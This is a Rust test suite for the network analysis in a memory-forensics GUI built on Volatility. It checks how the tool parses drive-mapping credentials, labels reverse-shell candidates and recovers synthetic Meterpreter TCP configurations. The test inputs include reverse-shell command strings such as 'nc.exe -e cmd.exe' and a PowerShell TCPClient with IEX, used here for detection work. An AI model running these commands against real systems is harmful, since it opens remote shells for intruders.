use serde_json::json;
use std::{
    fs,
    sync::atomic::{AtomicBool, AtomicU64},
};
use volgui::{
    analyses::AnalysisDraft,
    analysis::{self, network},
    artifacts::{ArtifactGroup, OperatingSystem},
    case::{Case, Evidence, RunStatus},
    network::{Endpoint, Entry, Graph, Selection},
    results::{Query, ResultStore, StoredRecord},
    settings::Settings,
    volatility::{Installation, Outcome, Plugin, Table},
};

fn entry(value: serde_json::Value) -> Entry {
    Entry::from_record(StoredRecord {
        id: 1,
        run_id: "fixture".into(),
        row: 0,
        record: Table::parse(&json!([value]).to_string())
            .unwrap()
            .rows
            .remove(0),
    })
}

#[test]
fn endpoint_selection_matches_address_and_port_on_the_same_side() {
    let e = entry(
        json!({"LocalAddr":"10.0.0.1","LocalPort":50000,"ForeignAddr":"10.0.0.2","ForeignPort":445}),
    );
    assert!(
        Selection::Endpoint(Endpoint {
            address: "10.0.0.2".into(),
            port: Some(445)
        })
        .matches(&e)
    );
    assert!(
        !Selection::Endpoint(Endpoint {
            address: "10.0.0.1".into(),
            port: Some(445)
        })
        .matches(&e)
    );
    assert!(Selection::Address("10.0.0.1".into()).matches(&e));
    assert!(!Selection::Address("10.0.0.10".into()).matches(&e));
    let missing = entry(json!({"LocalAddr":"10.0.0.1"}));
    let selection = Selection::Endpoint(Endpoint {
        address: "10.0.0.1".into(),
        port: None,
    });
    assert!(selection.matches(&missing));
    assert!(!selection.matches(&e));
}

#[test]
fn pid_search_matches_the_owner_exactly_instead_of_ports_or_substrings() {
    let mut graph = Graph::default();
    for value in [
        json!({"PID":12,"ForeignAddr":"192.0.2.1","ForeignPort":80}),
        json!({"PID":112,"ForeignAddr":"192.0.2.2","ForeignPort":12}),
        json!({"ForeignAddr":"192.0.2.12","ForeignPort":12}),
    ] {
        graph.push(entry(value));
    }
    assert_eq!(
        graph
            .overview(&volgui::network::Filter {
                text: "pid:12".into(),
                ..Default::default()
            })
            .matching,
        1
    );
    assert_eq!(
        graph
            .overview(&volgui::network::Filter {
                text: "12".into(),
                ..Default::default()
            })
            .matching,
        3
    );
}

#[test]
fn normalization_retains_ipv6_scopes_wildcards_zero_and_unknown_ports() {
    let e =
        entry(json!({"LocalAddr":"[2001:0db8::1]:443","RemoteAddr":"fe80::a%12","RemotePort":"0"}));
    assert_eq!(e.local.unwrap().label(), "[2001:db8::1]:443");
    assert_eq!(e.remote.unwrap().label(), "[fe80::a%12]:0");
    let e = entry(json!({"LocalAddr":"0.0.0.0","LocalPort":0,"ForeignAddr":"*","ForeignPort":"*"}));
    assert_eq!(e.local.unwrap().port, Some(0));
    assert_eq!(e.remote.unwrap().address, "*");
    let e = entry(json!({"LocalAddr":"not an address","LocalPort":70000}));
    assert!(e.local.is_none());
}

#[test]
fn drive_commands_preserve_explicit_credentials_and_do_not_invent_prompted_passwords() {
    for text in [
        r"net use n: /user:DOMAIN\alice \\10.0.0.2\share Pa55word!",
        r#"net use n: \\10.0.0.2\share "Pa55 word!" /user:DOMAIN\alice"#,
    ] {
        let rows = network::parse_text(text);
        let r = rows
            .iter()
            .find(|r| r.text("Finding") == "Network drive command")
            .unwrap();
        assert_eq!(r.text("Username"), r"DOMAIN\alice");
        assert!(r.text("Password").starts_with("Pa55"));
    }
    let rows = network::parse_text(
        r#"Run "net use n: /user:alice \\10.0.0.2\share Pa55word!" Sleep 10000"#,
    );
    assert_eq!(rows[0].text("Password"), "Pa55word!");
    for text in [
        r"net use n: \\10.0.0.2\share * /user:alice",
        r"net use n: \\10.0.0.2\share /user:alice",
    ] {
        assert!(network::parse_text(text)[0].text("Password").is_empty());
    }
    assert!(
        network::parse_text(r"\\server\share").is_empty(),
        "A hostname is not an IP without separate resolution evidence"
    );
}

#[test]
fn reverse_shell_labels_require_command_syntax_or_configuration() {
    let rows = network::parse_text("powershell New-Object Net.Sockets.TCPClient('10.0.0.2',4444)");
    assert_eq!(rows[0].text("Finding"), "TCP client command");
    let rows =
        network::parse_text("New-Object Net.Sockets.TCPClient('10.0.0.2',4444); IEX $command");
    assert_eq!(rows[0].text("Finding"), "Reverse shell command candidate");
    assert_eq!(
        network::parse_text("nc.exe -e cmd.exe 10.0.0.2 4444")[0].text("Port"),
        "4444"
    );
    assert!(network::parse_text("nc.exe -l -e cmd.exe 10.0.0.2 4444").is_empty());
    assert_eq!(
        network::parse_text("tcp://10.0.0.2:5059")[0].text("Finding"),
        "TCP transport endpoint"
    );
    assert!(network::parse_text("tcp://10.0.0.2:99999").is_empty());
}

#[test]
fn chained_drive_commands_do_not_share_credentials_or_match_ip_prefixes() {
    let text = r"net use k: \\10.0.0.2\home pass1 /user:bob & net use l: \\10.0.0.2\public /user:alice pass2";
    let rows = network::parse_text(text);
    assert_eq!(rows.len(), 2);
    assert_eq!(rows[0].text("Password"), "pass1");
    assert_eq!(rows[0].text("Username"), "bob");
    assert_eq!(rows[1].text("Password"), "pass2");
    assert_eq!(rows[1].text("Username"), "alice");
    let rows =
        network::parse_text(r"net use k: \\10.0.0.20\home pass1 /user:bob & echo \\10.0.0.2\home");
    assert_eq!(rows[1].text("Finding"), "SMB share reference");
    assert!(rows[1].text("Password").is_empty());
    assert!(
        network::parse_text(r"net use k: \\10.0.0.2\home n:")[0]
            .text("Password")
            .is_empty()
    );
}

fn case() -> (tempfile::TempDir, Case, Evidence) {
    case_with_contents(b"synthetic network capture")
}

fn case_with_contents(contents: &[u8]) -> (tempfile::TempDir, Case, Evidence) {
    let temp = tempfile::tempdir().unwrap();
    let path = temp.path().join("capture.raw");
    fs::write(&path, contents).unwrap();
    let mut evidence = Evidence::inspect(&path, &AtomicBool::new(false), |_, _| {}).unwrap();
    evidence.operating_system = OperatingSystem::Windows;
    let mut case = Case::create(&temp.path().join("case"), "Network fixture").unwrap();
    case.add_evidence(evidence.clone()).unwrap();
    (temp, case, evidence)
}

#[test]
fn graph_keeps_identical_occurrences_across_runs_and_rejects_stale_requests() {
    let (_temp, mut case, evidence) = case();
    let engine = Installation {
        user_memory_dumps: false,
        settings: Settings::default(),
        version: "Fixture".into(),
        plugins: vec![Plugin {
            id: "windows.netscan.NetScan".into(),
            description: String::new(),
        }],
    };
    let table=Table::parse(&json!([{"LocalAddr":"10.0.0.1","LocalPort":55000,"ForeignAddr":"10.0.0.2","ForeignPort":445}]).to_string()).unwrap();
    let mut ids = Vec::new();
    for _ in 0..2 {
        let run = engine
            .prepare(
                &evidence,
                "windows.netscan.NetScan",
                vec![],
                &case.directory.join("analyses"),
            )
            .unwrap();
        case.queue(run.clone()).unwrap();
        case.finish(
            &run.id,
            &Outcome {
                status: RunStatus::Completed,
                exit_code: Some(0),
                table: Some(table.clone()),
                message: String::new(),
            },
        )
        .unwrap();
        ids.push(run.id);
    }
    let store = ResultStore::at(&case.directory);
    let query = Query {
        runs: ids,
        text: "a graph search must not hide sidebar occurrences".into(),
        ..Default::default()
    };
    let graph = Graph::load(&store, &query, 7, &AtomicU64::new(7))
        .unwrap()
        .unwrap();
    assert_eq!(graph.entries.len(), 2);
    assert_ne!(
        graph.entries[0].source.run_id,
        graph.entries[1].source.run_id
    );
    let endpoint = Selection::Endpoint(Endpoint {
        address: "10.0.0.2".into(),
        port: Some(445),
    });
    assert_eq!(graph.selected_indices(Some(&endpoint)).len(), 2);
    assert!(graph.contains_selection(&endpoint));
    assert!(!graph.contains_selection(&Selection::Endpoint(Endpoint {
        address: "10.0.0.2".into(),
        port: Some(443)
    })));
    let filter = volgui::network::Filter {
        focus: Some("10.0.0.1".into()),
        text: "missing".into(),
        ..Default::default()
    };
    assert_eq!(graph.overview(&filter).matching, 0);
    assert_eq!(graph.selected_indices(Some(&endpoint)).len(), 2);
    assert!(
        Graph::load(&store, &query, 7, &AtomicU64::new(8))
            .unwrap()
            .is_none()
    );
    let directory = case.directory.clone();
    drop(case);
    let reopened = Case::open(&directory).unwrap();
    assert_eq!(
        ResultStore::at(&reopened.directory)
            .network_ids(&query.runs)
            .unwrap()
            .len(),
        2
    );
}

#[test]
fn native_analysis_retains_inventory_ports_and_exact_source_provenance() {
    let (_temp, mut case, evidence) = case();
    let engine = Installation {
        user_memory_dumps: false,
        settings: Settings::default(),
        version: "Fixture".into(),
        plugins: vec![Plugin {
            id: "windows.cmdline.CmdLine".into(),
            description: String::new(),
        }],
    };
    let source = engine
        .prepare(
            &evidence,
            "windows.cmdline.CmdLine",
            vec![],
            &case.directory.join("analyses"),
        )
        .unwrap();
    case.queue(source.clone()).unwrap();
    let table = Table::parse(
        &json!([{"PID":42,"Args":"tcp://10.0.0.2:80 tcp://10.0.0.2:443"}]).to_string(),
    )
    .unwrap();
    case.finish(
        &source.id,
        &Outcome {
            status: RunStatus::Completed,
            exit_code: Some(0),
            table: Some(table),
            message: String::new(),
        },
    )
    .unwrap();
    let run = analysis::prepare(&evidence, analysis::NETWORK, vec![]).unwrap();
    case.queue(run.clone()).unwrap();
    let outcome = analysis::execute(
        &case.directory,
        &case.document,
        &run,
        &AtomicBool::new(false),
        |_| {},
    );
    assert_eq!(outcome.status, RunStatus::Completed);
    let table = outcome.table.as_ref().unwrap();
    assert_eq!(table.rows.len(), 2);
    for row in &table.rows {
        assert_eq!(row.text("Source run"), source.id);
        assert_eq!(row.text("Source row"), "0");
        assert_eq!(row.text("Source field"), "Args");
        assert_eq!(row.text("Evidence SHA-256"), evidence.sha256);
    }
    assert!(outcome.message.contains("unavailable or not completed"));
    case.finish(&run.id, &outcome).unwrap();
    assert_eq!(case.results(&run.id).unwrap().rows.len(), 2);
}

#[test]
fn chooser_collects_available_sources_and_queues_a_native_barrier() {
    let (_temp, mut case, evidence) = case();
    let engine = Installation {
        user_memory_dumps: false,
        settings: Settings::default(),
        version: "Fixture".into(),
        plugins: [
            "windows.netscan.NetScan",
            "windows.pslist.PsList",
            "windows.cmdline.CmdLine",
        ]
        .into_iter()
        .map(|p| Plugin {
            id: p.into(),
            description: String::new(),
        })
        .collect(),
    };
    let mut draft = AnalysisDraft::new(&evidence);
    draft.selected.insert(analysis::NETWORK.into());
    let jobs = draft.prepare_in_case(&engine, &evidence, &case).unwrap();
    assert_eq!(jobs.len(), 4);
    assert_eq!(jobs.last().unwrap().plugin, analysis::NETWORK);
    assert!(
        jobs[..3]
            .iter()
            .all(|r| network::SOURCES.contains(&r.plugin.as_str()))
    );
    case.queue_batch(jobs.clone()).unwrap();
    let again = draft.prepare_in_case(&engine, &evidence, &case).unwrap();
    assert_eq!(again.len(), 1);
    let mut running = jobs;
    running[0].status = RunStatus::Completed;
    running[1].status = RunStatus::Running;
    running[2].status = RunStatus::Completed;
    assert!(
        volgui::analyses::next_queued_run(&running, std::num::NonZeroUsize::new(5).unwrap())
            .is_none()
    );
    assert_eq!(
        ArtifactGroup::for_plugin(analysis::NETWORK),
        ArtifactGroup::Network
    );
    assert!(analysis::prepare(&evidence, analysis::NETWORK, vec!["unexpected".into()]).is_err());
}

#[test]
fn network_analysis_ignores_raw_credentials_and_unvalidated_tcp_strings() {
    let (_temp, mut case, evidence) = case_with_contents(
        br"net use n: /user:alice \\10.0.0.2\share Password123! tcp://10.0.0.3:5059",
    );
    let run = analysis::prepare(&evidence, analysis::NETWORK, vec![]).unwrap();
    case.queue(run.clone()).unwrap();
    let outcome = analysis::execute(
        &case.directory,
        &case.document,
        &run,
        &AtomicBool::new(false),
        |_| {},
    );
    assert_eq!(outcome.status, RunStatus::Completed);
    assert!(
        outcome.table.unwrap().rows.is_empty(),
        "Network preprocessing must not promote arbitrary strings to payload configurations"
    );
    assert!(
        outcome
            .message
            .contains("Only structured payload configuration")
    );
}

#[test]
fn network_credentials_must_come_from_an_explicit_drive_command_in_a_collected_record() {
    let (_temp, mut case, evidence) = case();
    let engine = Installation {
        user_memory_dumps: false,
        settings: Settings::default(),
        version: "Fixture".into(),
        plugins: vec![Plugin {
            id: "windows.cmdline.CmdLine".into(),
            description: String::new(),
        }],
    };
    let source = engine
        .prepare(
            &evidence,
            "windows.cmdline.CmdLine",
            vec![],
            &case.directory.join("analyses"),
        )
        .unwrap();
    case.queue(source.clone()).unwrap();
    let table = Table::parse(
        &json!([
            {"PID":42,"Args":r"net use n: /user:alice \\10.0.0.2\share Password123!"},
            {"PID":43,"Args":"Username=bob Password=unrelated_secret"}
        ])
        .to_string(),
    )
    .unwrap();
    case.finish(
        &source.id,
        &Outcome {
            status: RunStatus::Completed,
            exit_code: Some(0),
            table: Some(table),
            message: String::new(),
        },
    )
    .unwrap();
    let run = analysis::prepare(&evidence, analysis::NETWORK, vec![]).unwrap();
    case.queue(run.clone()).unwrap();
    let outcome = analysis::execute(
        &case.directory,
        &case.document,
        &run,
        &AtomicBool::new(false),
        |_| {},
    );
    assert_eq!(outcome.status, RunStatus::Completed);
    let rows = outcome.table.unwrap().rows;
    assert_eq!(rows.len(), 1);
    assert_eq!(rows[0].text("Username"), "alice");
    assert_eq!(rows[0].text("Password"), "Password123!");
    assert_eq!(rows[0].text("IP"), "10.0.0.2");
    assert_eq!(rows[0].text("Source run"), source.id);
    assert_eq!(rows[0].text("Source row"), "0");
    assert_eq!(rows[0].text("Source field"), "Args");
    assert_eq!(rows[0].text("Source type"), "Engine record text");
}

#[test]
fn noise_filters_are_independent_and_keep_findings_and_unknown_owners() {
    use volgui::network::Filter;
    let mut graph = Graph::default();
    for value in [
        json!({"Owner":"browser.exe","PID":42,"LocalAddr":"10.0.0.1","LocalPort":50001,"ForeignAddr":"192.0.2.1","ForeignPort":443,"Proto":"TCPv4","State":"ESTABLISHED"}),
        json!({"Owner":"C:\\Windows\\System32\\SVCHOST.EXE","LocalAddr":"10.0.0.1","LocalPort":50002,"ForeignAddr":"192.0.2.2","ForeignPort":443}),
        json!({"Owner":"browser.exe","LocalAddr":"127.0.0.2","LocalPort":50003,"ForeignAddr":"127.0.0.1","ForeignPort":9000}),
        json!({"LocalAddr":"::1%12","LocalPort":50004,"ForeignAddr":"::ffff:127.0.0.1","ForeignPort":9000}),
        json!({"LocalAddr":"0.0.0.0","LocalPort":135,"ForeignAddr":"*","ForeignPort":0}),
        json!({"LocalAddr":"10.0.0.1","LocalPort":50005,"ForeignAddr":"192.0.2.3","ForeignPort":0}),
        json!({"LocalAddr":"10.0.0.1","LocalPort":9000}),
        json!({"LocalAddr":"10.0.0.1","LocalPort":50006,"ForeignAddr":"10.0.0.2","ForeignPort":445}),
        json!({"ForeignAddr":"192.0.2.4"}),
        json!({"Finding":"Meterpreter TCP configuration","Owner":"svchost.exe","IP":"127.0.0.1","Port":0}),
    ] {
        graph.push(entry(value));
    }
    assert_eq!(graph.overview(&Filter::default()).matching, 10);
    assert_eq!(
        graph
            .overview(&Filter {
                hide_system: true,
                ..Default::default()
            })
            .matching,
        9
    );
    assert_eq!(
        graph
            .overview(&Filter {
                hide_noise: true,
                ..Default::default()
            })
            .matching,
        5
    );
    let filter = Filter {
        hide_system: true,
        hide_noise: true,
        focus: Some("127.0.0.2".into()),
        ..Default::default()
    };
    let overview = graph.overview(&filter);
    assert_eq!(overview.matching, 4);
    assert_eq!(overview.indices.len(), 4);
    assert_eq!(overview.focus.as_deref(), Some("10.0.0.1"));
    assert!(!overview.addresses.contains("192.0.2.2"));
    assert!(!overview.addresses.contains("127.0.0.2"));
    assert!(overview.references.contains_key("127.0.0.1"));
    assert_eq!(
        graph.entries[overview.indices[0]]
            .source
            .record
            .text("Finding"),
        "Meterpreter TCP configuration"
    );
    let searched = graph.overview(&Filter {
        text: "pid:42".into(),
        protocol: Some("TCPv4".into()),
        state: Some("ESTABLISHED".into()),
        ..filter
    });
    assert_eq!(searched.matching, 1);
    assert_eq!(graph.entries[searched.indices[0]].pid, "42");
}

fn payload_configuration() -> Vec<u8> {
    let mut bytes = vec![0; 48 + 1038];
    bytes[8..12].copy_from_slice(&0x56a2b5f0u32.to_le_bytes());
    bytes[12..16].copy_from_slice(&604800u32.to_le_bytes());
    bytes[16..32].fill(0x11);
    let uri: Vec<_> = "tcp://192.0.2.5:5059"
        .encode_utf16()
        .flat_map(u16::to_le_bytes)
        .collect();
    bytes[48..48 + uri.len()].copy_from_slice(&uri);
    for (i, v) in [300u32, 3600, 10].into_iter().enumerate() {
        bytes[48 + 1024 + i * 4..48 + 1028 + i * 4].copy_from_slice(&v.to_le_bytes());
    }
    bytes
}

#[test]
fn incomplete_payloads_remain_candidates_and_never_gain_socket_ownership() {
    let mut complete = payload_configuration();
    complete[32..48].fill(0x22);
    let mut incomplete = payload_configuration();
    incomplete[16..32].fill(0x33);
    // Model a transport crossing into an unrelated physical page.
    incomplete[48 + 400..].fill(0x7f);
    let incomplete_at = complete.len();
    complete.extend(incomplete);
    let (_temp, mut case, evidence) = case_with_contents(&complete);
    let mut socket_run = analysis::prepare(&evidence, analysis::NETWORK, vec![]).unwrap();
    socket_run.plugin = "windows.netscan.NetScan".into();
    case.queue(socket_run.clone()).unwrap();
    case.finish(&socket_run.id, &Outcome {
        status: RunStatus::Completed, exit_code: Some(0), message: String::new(),
        table: Some(Table::parse(&json!([{"PID":1234,"Owner":"example.exe","ForeignAddr":"192.0.2.5","ForeignPort":5059}]).to_string()).unwrap()),
    }).unwrap();
    let run = analysis::prepare(&evidence, analysis::NETWORK, vec![]).unwrap();
    case.queue(run.clone()).unwrap();
    let (table, message) = network::analyze(
        &case.directory,
        &case.document,
        &run,
        &AtomicBool::new(false),
        &|_| {},
    )
    .unwrap();
    assert_eq!(table.rows.len(), 2);
    assert!(message.contains("1 validated Meterpreter TCP configurations; 1 incomplete"));
    let full = &table.rows[0];
    let partial = &table.rows[1];
    assert_eq!(full.text("Finding"), "Meterpreter TCP configuration");
    assert_eq!(full.text("Configuration bytes SHA-256").len(), 64);
    assert_eq!(full.text("Session GUID"), "22".repeat(16));
    assert_eq!(
        partial.text("Finding"),
        "Incomplete Meterpreter TCP configuration candidate"
    );
    assert_eq!(partial.text("Payload UUID"), "33".repeat(16));
    assert!(partial.text("Configuration bytes SHA-256").is_empty());
    assert!(
        partial.fields["Payload configuration"]
            .get("Communications timeout seconds")
            .is_none()
    );
    assert_eq!(
        volgui::network::source_offset(partial),
        Some(incomplete_at as u64 + 48)
    );
    for row in &table.rows {
        assert!(row.text("PID").is_empty());
        assert!(row.text("Owner").is_empty());
        assert!(row.text("Ownership evidence").starts_with("Not recovered"));
        assert!(
            row.text("Connection evidence")
                .contains("No process-owned connection")
        );
    }
}

#[test]
fn configuration_summary_preserves_distinct_payloads_and_deduplicates_parser_runs() {
    let mut first = entry(
        json!({"Finding":"Meterpreter TCP configuration","Evidence SHA-256":"capture","Configuration offset":0,"IP":"192.0.2.5","Port":5059,"Payload configuration":{"Payload UUID":"uuid-a"}}),
    );
    let duplicate = first.clone();
    let second = entry(
        json!({"Finding":"Meterpreter TCP configuration","Evidence SHA-256":"capture","Configuration offset":4096,"IP":"192.0.2.5","Port":5059,"Payload UUID":"uuid-b"}),
    );
    let incomplete = entry(
        json!({"Finding":"Incomplete Meterpreter TCP configuration candidate","Evidence SHA-256":"capture","Configuration offset":8192,"IP":"192.0.2.6","Port":4364,"Payload UUID":"uuid-c"}),
    );
    first.source = std::sync::Arc::new(StoredRecord {
        id: 2,
        ..(*first.source).clone()
    });
    let summary = volgui::network::configuration_summary(
        [&first, &duplicate, &second, &incomplete].into_iter(),
    )
    .unwrap();
    assert!(
        summary.contains("2 validated, 1 incomplete; 3 distinct payload UUIDs"),
        "{summary}"
    );
    assert!(summary.contains("not process counts"));
    assert!(
        volgui::network::configuration_summary(
            [&entry(json!({"ForeignAddr":"192.0.2.5","PID":12}))].into_iter()
        )
        .is_none()
    );
}

#[test]
fn payload_recovery_belongs_to_network_and_retains_offsets_across_chunk_boundaries() {
    let mut bytes = vec![0xff; 4 * 1024 * 1024 - 60];
    let config_at = bytes.len();
    bytes.extend(payload_configuration());
    // A plain URL and an invalid configuration must not become payload findings.
    bytes.extend(
        "tcp://192.0.2.6:4444"
            .encode_utf16()
            .flat_map(u16::to_le_bytes),
    );
    let mut invalid = payload_configuration();
    invalid[8..12].fill(0xff);
    bytes.extend(invalid);
    let (_temp, mut case, evidence) = case_with_contents(&bytes);
    let run = analysis::prepare(&evidence, analysis::NETWORK, vec![]).unwrap();
    case.queue(run.clone()).unwrap();
    let outcome = analysis::execute(
        &case.directory,
        &case.document,
        &run,
        &AtomicBool::new(false),
        |_| {},
    );
    assert_eq!(outcome.status, RunStatus::Completed, "{}", outcome.message);
    let rows = &outcome.table.as_ref().unwrap().rows;
    assert_eq!(rows.len(), 1);
    assert_eq!(rows[0].text("Finding"), "Meterpreter TCP configuration");
    assert_eq!(rows[0].text("IP"), "192.0.2.5");
    assert_eq!(rows[0].fields["Configuration offset"], config_at);
    assert_eq!(rows[0].fields["Match offset"], config_at + 48);
    assert_eq!(
        volgui::network::source_offset(&rows[0]),
        Some(config_at as u64 + 48)
    );
    assert_eq!(rows[0].text("Evidence SHA-256"), evidence.sha256);
    assert_eq!(rows[0].text("Parser version"), network::PARSER_VERSION);
    assert!(rows[0].text("PID").is_empty());
    case.finish(&run.id, &outcome).unwrap();
    let graph = Graph::load(
        &ResultStore::at(&case.directory),
        &Query {
            runs: vec![run.id],
            ..Default::default()
        },
        1,
        &AtomicU64::new(1),
    )
    .unwrap()
    .unwrap();
    assert_eq!(graph.entries.len(), 1);
    assert_eq!(
        graph.entries[0].remote.as_ref().unwrap().label(),
        "192.0.2.5:5059"
    );
    let download_run = analysis::prepare(&evidence, analysis::DOWNLOADS, vec![]).unwrap();
    case.queue(download_run.clone()).unwrap();
    let downloads = analysis::execute(
        &case.directory,
        &case.document,
        &download_run,
        &AtomicBool::new(false),
        |_| {},
    );
    assert_eq!(
        downloads.status,
        RunStatus::Completed,
        "{}",
        downloads.message
    );
    assert!(
        downloads
            .table
            .unwrap()
            .rows
            .iter()
            .all(|r| r.text("Finding") != "Meterpreter TCP configuration")
    );
}

#[test]
fn historical_download_configurations_are_routed_without_changing_source_records() {
    let (_temp, mut case, evidence) = case();
    let run = analysis::prepare(&evidence, analysis::DOWNLOADS, vec![]).unwrap();
    case.queue(run.clone()).unwrap();
    case.finish(&run.id, &Outcome { status: RunStatus::Completed, exit_code: Some(0), message: String::new(), table: Some(Table::parse(&json!([
        {"Finding":"Download origin; execution not established","Filename":"payload.exe"},
        {"Finding":"Meterpreter TCP configuration","IP":"192.0.2.5","Port":5059,"Match offset":48,"Configuration offset":0}
    ]).to_string()).unwrap()) }).unwrap();
    let store = ResultStore::at(&case.directory);
    let query = Query {
        runs: vec![run.id.clone()],
        ..Default::default()
    };
    let downloads = store.query(&query).unwrap();
    assert_eq!(downloads.ids.len(), 1);
    assert_eq!(
        store.fetch(&downloads.ids).unwrap()[0]
            .record
            .text("Filename"),
        "payload.exe"
    );
    let graph = Graph::load(&store, &query, 1, &AtomicU64::new(1))
        .unwrap()
        .unwrap();
    assert_eq!(graph.entries.len(), 1);
    assert_eq!(graph.entries[0].source.run_id, run.id);
    assert_eq!(graph.entries[0].source.row, 1);
    assert_eq!(graph.entries[0].source.record.fields["Match offset"], 48);
    let original = store.record(&run.id, 1).unwrap().unwrap();
    assert_eq!(
        original.record.text("Finding"),
        "Meterpreter TCP configuration"
    );
}

#[test]
fn configuration_recovery_reports_its_limit_and_honors_cancellation() {
    let config = payload_configuration();
    let (_temp, mut case, evidence) = case_with_contents(&config.repeat(2_001));
    let run = analysis::prepare(&evidence, analysis::NETWORK, vec![]).unwrap();
    case.queue(run.clone()).unwrap();
    let outcome = analysis::execute(
        &case.directory,
        &case.document,
        &run,
        &AtomicBool::new(false),
        |_| {},
    );
    assert_eq!(outcome.status, RunStatus::Completed, "{}", outcome.message);
    let rows = outcome.table.unwrap().rows;
    assert_eq!(rows.len(), 2_000);
    assert_eq!(
        rows.last().unwrap().fields["Configuration offset"],
        1_999 * config.len()
    );
    assert!(outcome.message.contains("2,000 configuration limit"));
    let cancelled = analysis::execute(
        &case.directory,
        &case.document,
        &run,
        &AtomicBool::new(true),
        |_| {},
    );
    assert_eq!(cancelled.status, RunStatus::Cancelled);
}

#[test]
fn source_bytes_accept_zero_offsets_without_treating_engine_addresses_as_acquisition_offsets() {
    for value in [
        json!({"Finding":"Meterpreter TCP configuration","Acquisition offset":0}),
        json!({"Source type":"Validated acquisition configuration","Match offset":0}),
        json!({"Source type":"Residual memory string","Offset":0}),
    ] {
        assert_eq!(
            volgui::network::source_offset(&entry(value).source.record),
            Some(0)
        );
    }
    assert_eq!(
        volgui::network::source_offset(
            &entry(json!({"Source type":"Engine record text","Offset":0}))
                .source
                .record
        ),
        None
    );
}

#[test]
fn interesting_traffic_combines_recovered_findings_smb_and_remote_administration() {
    use volgui::network::Filter;
    let mut graph = Graph::default();
    for value in [
        json!({"Finding":"Meterpreter TCP configuration","IP":"192.0.2.8","Port":5059}),
        json!({"Finding":"Network drive command","IP":"192.0.2.9","Port":445}),
        json!({"LocalAddr":"10.0.0.1","LocalPort":50000,"ForeignAddr":"10.0.0.2","ForeignPort":445,"PID":42}),
        json!({"LocalAddr":"10.0.0.1","LocalPort":50001,"ForeignAddr":"10.0.0.3","ForeignPort":3389}),
        json!({"LocalAddr":"10.0.0.1","LocalPort":50002,"ForeignAddr":"192.0.2.10","ForeignPort":443}),
        json!({"LocalAddr":"10.0.0.1","LocalPort":50003,"ForeignAddr":"192.0.2.11","ForeignPort":4444}),
    ] {
        graph.push(entry(value));
    }
    let filter = Filter {
        interesting_only: true,
        hide_noise: true,
        hide_system: true,
        ..Default::default()
    };
    let overview = graph.overview(&filter);
    assert_eq!(overview.matching, 4);
    assert!(overview.references.contains_key("192.0.2.8"));
    assert!(overview.references.contains_key("192.0.2.9"));
    assert!(!overview.addresses.contains("192.0.2.10"));
    assert!(
        !overview.addresses.contains("192.0.2.11"),
        "A port alone does not identify a payload"
    );
    assert_eq!(
        graph
            .overview(&Filter {
                text: "pid:42".into(),
                ..filter
            })
            .matching,
        1
    );
    assert_eq!(graph.overview(&Filter::default()).matching, 6);
}

#[test]
fn all_source_ips_preserve_each_source_and_peer_without_inventing_reference_edges() {
    let mut graph = Graph::default();
    for value in [
        json!({"LocalAddr":"10.0.0.1","LocalPort":50000,"ForeignAddr":"192.0.2.1","ForeignPort":445}),
        json!({"LocalAddr":"10.0.0.2","LocalPort":50001,"ForeignAddr":"192.0.2.1","ForeignPort":443}),
        json!({"Finding":"Meterpreter TCP configuration","IP":"192.0.2.2","Port":5059}),
    ] {
        graph.push(entry(value));
    }
    let filter = volgui::network::Filter {
        all_sources: true,
        ..Default::default()
    };
    let overview = graph.overview(&filter);
    assert_eq!(overview.peers.len(), 3);
    let first = &overview.peers[&(Some("10.0.0.1".into()), "192.0.2.1".into())];
    assert_eq!(first.first().unwrap().0.port, Some(50000));
    assert_eq!(first.first().unwrap().1.port, Some(445));
    let second = &overview.peers[&(Some("10.0.0.2".into()), "192.0.2.1".into())];
    assert_eq!(second.first().unwrap().0.port, Some(50001));
    assert_eq!(second.first().unwrap().1.port, Some(443));
    assert!(overview.peers[&(None, "192.0.2.2".into())].is_empty());
    let single = graph.overview(&volgui::network::Filter {
        all_sources: false,
        focus: Some("10.0.0.1".into()),
        ..filter
    });
    assert_eq!(single.peers.len(), 2);
    assert_eq!(single.indices.len(), overview.indices.len());
}

#[test]
fn interesting_recovery_retries_interrupted_or_old_parsers_without_duplicate_jobs() {
    let (_temp, mut case, evidence) = case();
    let mut run = analysis::prepare(&evidence, analysis::NETWORK, vec![]).unwrap();
    run.status = RunStatus::Interrupted;
    case.document.runs.push(run);
    assert!(network::needs_recovery(&case.document, &evidence.id));
    let run = case.document.runs.last_mut().unwrap();
    run.status = RunStatus::Completed;
    run.message = "Parser: network-v2-records".into();
    assert!(network::needs_recovery(&case.document, &evidence.id));
    case.document.runs.last_mut().unwrap().status = RunStatus::Queued;
    assert!(!network::needs_recovery(&case.document, &evidence.id));
    case.document.runs.last_mut().unwrap().status = RunStatus::Running;
    assert!(!network::needs_recovery(&case.document, &evidence.id));
    let run = case.document.runs.last_mut().unwrap();
    run.status = RunStatus::Completed;
    run.message = format!("Parser: {}", network::PARSER_VERSION);
    assert!(!network::needs_recovery(&case.document, &evidence.id));
    case.document.runs.last_mut().unwrap().evidence_id = "another capture".into();
    assert!(network::needs_recovery(&case.document, &evidence.id));
}
